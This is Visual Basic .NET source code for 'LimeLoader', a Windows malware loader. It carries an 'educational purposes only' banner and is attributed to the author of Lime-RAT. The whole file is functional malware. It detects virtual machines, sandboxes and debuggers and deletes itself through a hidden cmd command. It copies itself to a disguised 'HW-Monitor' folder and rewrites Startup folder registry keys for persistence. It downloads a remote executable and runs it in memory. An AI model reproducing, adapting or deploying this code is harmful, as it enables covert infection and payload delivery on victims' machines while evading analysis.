'#################################################################################
'#                                                                               #
'#                                                                               #
'#       │ Author     : NYAN CAT                                                 #
'#       │ Name       : LimeLoader * 24/11/2018                                  #
'#                                                                               #
'#       Contact Me   : https://github.com/NYAN-x-CAT                            #
'#                                                                               #
'#       This program Is distributed for educational purposes only.              #
'#                                                                               #
'#################################################################################


Public Class Program


    Public Shared Sub Main()
        'Remove //Virtual_Machine// when testing
        Virtual_Machine() : Install("HW-Monitor") : Load("http://127.0.0.1:80/Payload.exe")
    End Sub

    Public Shared Sub Install(ByVal Name As String)

        Dim DropDirectory As String = IO.Path.Combine(IO.Path.GetTempPath, Name)
        Dim DropFile As String = "/" + Name + ".exe"
        Dim DropLocation As String = IO.Path.Combine(IO.Path.GetTempPath, DropDirectory + DropFile)

        Try
            If Not IO.Directory.Exists(DropDirectory) Then
                IO.Directory.CreateDirectory(DropDirectory)
            End If

            '############################################################################################################
            '#                                                                                                          #
            '#   https://www.andreafortuna.org/dfir/malware-persistence-techniques/                                     #
            '#                              Startup Keys                                                                #
            '#                                                                                                          #
            '#  //If Iam admin//                                                                                        #                                                                              
            '#  HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ Shell Folders          #
            '#  HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ User Shell Folders     #
            '#                                                                                                          #
            '############################################################################################################

            If Not Reflection.Assembly.GetExecutingAssembly.Location = DropLocation Then
                IO.File.Copy(Reflection.Assembly.GetExecutingAssembly.Location, DropLocation, True)
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", True).SetValue("Startup", DropDirectory)
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", True).SetValue("Startup", DropDirectory)

                Diagnostics.Debug.WriteLine("Installed!")

            Else
                Diagnostics.Debug.WriteLine("Already installed!")
            End If


        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Public Shared Sub Load(ByVal Payload As String)
        Dim Load As Object = CallByName(AppDomain.CurrentDomain, "Load", CallType.Method, Download(Payload))
        Dim EntryPoint As Object = CallByName(Load, "EntryPoint", CallType.Get)
        Try
            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, Nothing)
        Catch ex As Exception
            Dim Invoke As Object = CallByName(EntryPoint, "Invoke", CallType.Method, Nothing, New Object() {Nothing})
        End Try
    End Sub


    Public Shared Function Download(ByVal URL As String) As Byte()
        Dim EXE As Byte() = Nothing

        If Check_Internet() Then

            Try

                Dim WC As New Net.WebClient
                EXE = WC.DownloadData(URL)
                WC.Dispose()
            Catch ex As Exception
                Diagnostics.Debug.WriteLine("Wrong URL??") : Environment.Exit(0)
            End Try

        Else
            Check_Internet()
        End If

        Return EXE
    End Function

    Public Shared Function Check_Internet() As Boolean
        Threading.Thread.Sleep(2500)

        Dim request As Net.WebRequest = Net.WebRequest.Create("https://www.bing.com/")
        Try
            Dim response As Net.WebResponse = request.GetResponse()
            Diagnostics.Debug.WriteLine("Connected to Internet!")
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
            Return False
        End Try
        Return True
    End Function

    Public Shared Sub Virtual_Machine()

        '#################################################################################
        '# https://github.com/NYAN-x-CAT/Lime-RAT/blob/master/Project/Client/C_AntiVM.vb #
        '#################################################################################

        Try

            Dim OS As New Devices.ComputerInfo
            Dim VM = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("System\CurrentControlSet\Services\Disk\Enum\").GetValue("0", "")
            If VM.ToString.ToLower.Contains("vmware") OrElse VM.ToString.ToLower.Contains("qemu") Then
                GoTo del

            ElseIf OS.OSFullName.ToLower.Contains("XP".ToLower) Then
                GoTo del

            ElseIf LoadLibrary("SbieDll.dll") = True Then
                GoTo del

            ElseIf Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
                GoTo del

            ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
                GoTo del

            End If
            Exit Sub
del:

            Shell("cmd.exe /c ping 0 -n 2 & del " & """" & Reflection.Assembly.GetExecutingAssembly.Location & """", AppWinStyle.Hide, False, -1)
            Environment.Exit(0)

        Catch ex As Exception
        End Try
    End Sub

    <Runtime.InteropServices.DllImport("kernel32.dll")>
    Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
    End Function

End Class
